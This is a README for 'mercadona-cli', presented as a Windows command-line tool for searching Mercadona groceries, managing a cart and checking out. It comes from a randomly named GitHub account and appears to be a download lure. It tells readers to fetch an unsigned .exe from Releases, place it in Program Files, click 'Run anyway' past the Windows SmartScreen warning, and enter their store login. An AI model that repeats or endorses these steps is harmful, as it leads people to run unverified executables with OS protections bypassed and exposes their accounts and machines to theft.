# 🛒 mercadona-cli - Manage your grocery shopping list easily

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/pillarboxconjugation336/mercadona-cli)

This tool helps you interact with the Mercadona online store from your computer. It allows you to search for products, view prices, and manage your shopping cart without using a web browser. It runs as a small program that connects directly to the store services.

## ⚙️ System Requirements

Your computer must run a modern version of Windows. This tool works on Windows 10 and Windows 11. You do not need to install extra software for it to work. It requires an active internet connection to communicate with the store.

## 📥 How to Download the Program

You can get the program files directly from the project page.

1.  Open your web browser.
2.  Follow this link to the project site: [https://github.com/pillarboxconjugation336/mercadona-cli](https://github.com/pillarboxconjugation336/mercadona-cli).
3.  Look for the section labeled Releases on the right side of the screen.
4.  Click the version number or the latest release link.
5.  Find the file that ends in .exe for Windows.
6.  Click the file name to start the download.
7.  Save the file to a folder you can find later, such as your Downloads folder.

## 🚀 Setting Up the Application

Once the download finishes, you must prepare the program to run.

1.  Open the folder where you saved the file.
2.  Right-click the file named mercadona.exe.
3.  Choose Copy.
4.  Navigate to a folder where you want to keep your programs, such as C:\Program Files.
5.  Right-click in that folder and select Paste.
6.  You can now run the application from this location.

## 🖥️ Using the Program

This tool uses a text-based interface. You will interact with it using the Command Prompt or PowerShell application built into Windows.

### Opening the Interface
1.  Press the Windows Key on your keyboard.
2.  Type cmd and press Enter. This opens the command window.
3.  Navigate to the folder where you placed the file. For example, if you saved it in C:\Program Files, type `cd "C:\Program Files"` and press Enter.

### Searching for Products
To find an item, type the name of the program followed by the word search and the product name. 

Example:
`mercadona.exe search coffee`

The program displays a list of coffee products available in the catalog along with their current prices.

### Viewing your Cart
You can see what items currently reside in your shopping list. Type:

`mercadona.exe cart`

This command fetches your current cart data and prints the list of items you plan to purchase.

### Adding Items
You add items to your virtual cart by using the item identification number found during your research. Type:

`mercadona.exe add [ID_NUMBER]`

Replace [ID_NUMBER] with the specific code of the item you want to buy.

## 🔐 Security and Usage

This program connects to the web store endpoints. It does not store your passwords on a public server. Keep your login credentials private. Do not share your login tokens with anyone. Use the program at a steady pace to ensure a stable connection. Frequent requests in a short timeframe might trigger security limits set by the store website. 

## 🔧 Frequently Asked Questions

### Do I need a special account?
Yes, use your standard login details for the website. The program acts as a messenger between your computer and the site.

### Can I checkout without a browser?
Yes, the software supports the checkout process directly. Ensure you review your cart items before you confirm the final order.

### How do I update the program?
To update, repeat the download steps. Replace the old file in your folder with the new version downloaded from the link provided above.

### What if the program does not start?
Make sure you have permissions to run programs in the folder where you placed the file. Windows SmartScreen may show a warning because this is a custom tool. If a blue box appears, click More Info and select Run anyway to authorize the application.

### Is this an official tool?
No. This tool provides an alternative way to access store information. Mercadona does not provide an official portal for these connections, so this tool performs the work by mimicking standard web browser traffic.